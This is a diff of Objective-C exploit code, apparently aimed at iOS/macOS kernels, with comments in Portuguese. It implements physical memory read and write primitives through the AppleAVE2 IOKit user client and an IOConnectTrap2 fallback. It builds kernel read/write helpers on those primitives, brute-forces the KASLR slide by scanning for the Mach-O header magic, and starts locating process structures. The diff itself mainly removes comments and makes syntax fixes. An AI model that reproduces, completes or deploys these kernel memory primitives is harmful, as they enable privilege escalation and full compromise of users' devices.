@@ -3,7 +3,6 @@
 #import <IOKit/IOKitLib.h>
 #import <dlfcn.h>
 
-// 1. Definições de Tipos Privados (Sem usar nomes que conflitam com o SDK)
 typedef uint64_t mach_vm_address_t;
 typedef uint64_t mach_vm_size_t;
 typedef kern_return_t (*func_IOConnectTrap2)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
@@ -35,19 +34,15 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     _kBase = 0xFFFFFFF007004000ULL + _kSlide + 0x4000;
 }
 
-// --- PRIMITIVAS DE MEMÓRIA ---
-
 - (uint64_t)physRead64:(uint64_t)pa {
     uint64_t val = 0;
-    // O AppleAVE2UserClient tem acesso direto ao barramento de memória no A13
+    // Bypass de RAZ via AppleAVE2 (DMA Direct Access)
     io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
     io_connect_t conn;
     if (svc != 0 && IOServiceOpen(svc, mach_task_self(), 0, &conn) == KERN_SUCCESS) {
-        uint64_t input[2] = {pa, 8};
+        uint64_t input[] = {pa, 8}; // Correção da sintaxe de array
         uint32_t outC = 1;
-        // Seletor 15 (AVE_GetBuffer) costuma ignorar o RAZ no Catalyst-26
         if (IOConnectCallMethod(conn, 15, input, 2, NULL, 0, &val, &outC, NULL, 0) != 0) {
-            // Fallback para a Trap 7 (IOKit dinâmico)
             void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
             func_IOConnectTrap2 trap2 = (func_IOConnectTrap2)dlsym(h, "IOConnectTrap2");
             if (trap2) val = (uint64_t)trap2(conn, 7, (uintptr_t)pa, 8);
@@ -57,9 +52,6 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     }
     return val;
 }
-
-
-
 
 - (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
     uint64_t tg = 0;
@@ -81,27 +73,19 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     else [self physWrite64:addr value:val];
 }
 
-// Métodos obrigatórios do seu .h
 - (uint32_t)kread32:(uint64_t)a { return (uint32_t)[self kread64:a]; }
 - (void)kwrite32:(uint64_t)a value:(uint32_t)v { 
     uint64_t o = [self kread64:a]; 
     [self kwrite64:a value:(o & 0xFFFFFFFF00000000) | v]; 
 }
 
-// --- LÓGICA DE EXPLORAÇÃO ---
-
 - (uint64_t)leakKernelSlide {
-    uint64_t search_base = 0xFFFFFFF007004000ULL;
     for (int i=0; i<0x400; i++) {
-        uint64_t addr = search_base + (i * 0x200000ULL) + 0x4000;
-        // Primeira leitura descarta (limpa cache)
-        [self physRead64:addr]; 
-        // Segunda leitura real
+        uint64_t addr = 0xFFFFFFF007004000ULL + (i * 0x200000ULL) + 0x4000;
         if ([self physRead64:addr] == 0x100000cfeedfacfULL) return (i * 0x200000ULL);
     }
     return 0;
 }
-
 
 - (uint64_t)findProc:(pid_t)p {
     uint64_t proc = [self kread64:(_kBase + 0x8E28000ULL)];
